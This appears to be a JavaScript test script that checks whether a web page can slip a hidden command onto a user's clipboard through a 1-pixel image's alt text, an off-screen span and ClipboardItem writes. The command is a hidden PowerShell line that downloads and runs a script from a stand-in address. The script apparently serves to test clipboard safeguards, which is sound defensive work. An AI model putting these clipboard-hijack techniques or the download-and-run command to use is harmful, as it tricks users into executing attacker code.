import { start } from "docs/review-2026-11-16/repros/guards-lens/harness.mjs";
const CMD = "powershell -w hidden -nop -c \"iex (iwr 'http://203.0.113.5/a.ps1')\"";
const esc = CMD.replace(/&/g,"&amp;").replace(/"/g,"&quot;").replace(/</g,"&lt;");
const page0 = `<!doctype html><style>#hid::selection{background:transparent}</style><body><p id=vis>Your verification code: 4821 <img alt="${esc}" width=1 height=1 src="data:image/gif;base64,R0lGODlhAQABAAAAACw="></p>
<span id=hid style="position:fixed;left:-9999px">${esc}</span><button id=b>go</button><script>window.CMD=${JSON.stringify(CMD)}</script>`;
const { ctx, base, close } = await start({ "/": page0 });
const page = await ctx.newPage();
page.on("console", (m) => { if (!m.text().includes("404")) console.log("   console:", m.text()); });
await page.goto(base + "/");
await page.waitForTimeout(500);
const res = async (name) => { await page.waitForTimeout(600); const got = await page.evaluate(() => navigator.clipboard.readText()); console.log(name.padEnd(60), got.includes("powershell") ? "COMMAND ON CLIPBOARD" : "no command: " + JSON.stringify(got).slice(0,40)); };
await page.evaluate(() => navigator.clipboard.writeText("clean"));
// user drags over visible "verification code" line and presses Ctrl+C
await page.evaluate(() => { const s=getSelection(); s.removeAllRanges(); const r=document.createRange(); r.selectNodeContents(document.getElementById('vis')); s.addRange(r); });
await page.keyboard.press("Control+c");
await res("Ctrl+C on visible line holding a 1px <img alt=CMD>");
await page.evaluate(() => navigator.clipboard.writeText("clean"));
await page.evaluate(() => getSelection().selectAllChildren(document.getElementById('hid')));
await page.keyboard.press("Control+c");
await res("page pre-selects hidden span, user presses Ctrl+C");
for (const [name, fn] of [
  ["write(): ClipboardItem with Promise<string>", `() => navigator.clipboard.write([new ClipboardItem({'text/plain': Promise.resolve(CMD)})]).catch(e=>console.log('rej', e.name, e.message))`],
  ["write(): ClipboardItem with string value", `() => navigator.clipboard.write([new ClipboardItem({'text/plain': CMD})]).catch(e=>console.log('rej', e.name, e.message))`],
]) {
  await page.evaluate(() => navigator.clipboard.writeText("clean"));
  await page.evaluate(`document.getElementById('b').onclick = ${fn}; 0`);
  await page.click("#b");
  await res(name);
}
await close();
